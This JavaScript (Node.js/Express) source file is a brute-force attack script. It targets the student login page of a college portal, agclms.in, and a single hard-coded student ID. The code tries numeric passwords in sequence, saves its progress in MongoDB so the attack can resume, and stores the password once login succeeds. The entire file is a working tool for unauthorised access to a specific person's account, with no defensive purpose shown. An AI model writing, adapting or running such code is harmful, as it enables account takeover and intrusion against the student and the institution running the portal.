import Password from "./PawwordSchema.js";
import mongoose from "mongoose";
import dotenv from "dotenv";
import express from "express";
import fetch from "node-fetch";
import DBTrack from "./DBTrackSchema.js";

dotenv.config({ path: "./.env" });

const app = express();
const port = 3000;

let isInitiated;
const username = 2412800;
const fail_url = "https://agclms.in/Elogin/StudentLogin";
const succ_url = "https://agclms.in/DashBoardStudent";
let totalDigit = 1;

const currentTrackId = "massu";

async function connectDB() {
  if (mongoose.connection.readyState === 0) {
    await mongoose.connect(process.env.MONGODB_URI);
    console.log("Connected to MongoDB");
  }
}

app.get("/", async (req, res) => {
  let str;
  if (isInitiated) return res.send(`Initiated, ${str}`);
  isInitiated = true;

  await connectDB();

  const isTracks = await DBTrack.findOne({ trackId: currentTrackId });

  if (isTracks) {
    console.log("track found : ", isTracks);

    totalDigit = isTracks.digiTrack;
    str = isTracks.passTrack;
  } else {
    console.log("track not found");

    const newTrack = new DBTrack({
      trackId: currentTrackId,
      passTrack: "0",
      digiTrack: 1,
    });

    await newTrack.save();

    console.log(`no past track for ${currentTrackId}, fresh track made`);
    str = "0";
    totalDigit = 1;
  }

  console.log(`initiated with pass : ${str}, digi : ${totalDigit}`);

  main(str);
  res.send("Initiated");
});

app.listen(port, () => {
  console.log(`App listening on port ${port}`);
});

function nextComb(str) {
  if (str[0] === "9") {
    totalDigit++;
    return "0".repeat(totalDigit);
  }

  let arr = str.split("");

  for (let i = arr.length - 1; i >= 0; i--) {
    if (arr[i] === "9") {
      arr[i] = "0";
    } else {
      arr[i] = (parseInt(arr[i]) + 1).toString();
      break;
    }
  }

  return arr.join("");
}

const main = async (str) => {
  try {

    for (let i = 0; i < 10000; i++) {
      const response = await fetch("https://agclms.in/Elogin/StudentLogin", {
        method: "POST",
        headers: {
          Accept:
            "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
          "Accept-Language": "en-US,en;q=0.9,hi;q=0.8,pa;q=0.7",
          "Content-Type": "application/x-www-form-urlencoded",
          "Cache-Control": "max-age=0",
        },
        referrer: "https://agclms.in/Elogin/StudentLogin",
        body: `StudentId=${username}&Password=${str}&__RequestVerificationToken=YOUR_TOKEN_HERE`,
      });

      if (response.url === fail_url) {
        console.log(`Attempted: ${str}`);
      } else if (response.url === succ_url) {
        await connectDB();
        console.log(`Password found: ${str}`);

        const password = new Password({ password: str });
        await password.save();
        return;
      } else {
        console.error("Unexpected URL:", response.url);
        return;
      }

      try {
        await connectDB();
        const oldTrack = await DBTrack.findOne({ trackId: currentTrackId });

        oldTrack.passTrack = str;
        oldTrack.digiTrack = totalDigit;

        await oldTrack.save();
      } catch {
        console.log(`DB error while saving track : ${str}, ${currentTrackId}`);
      }

      str = nextComb(str);
    }
  } catch {}
};
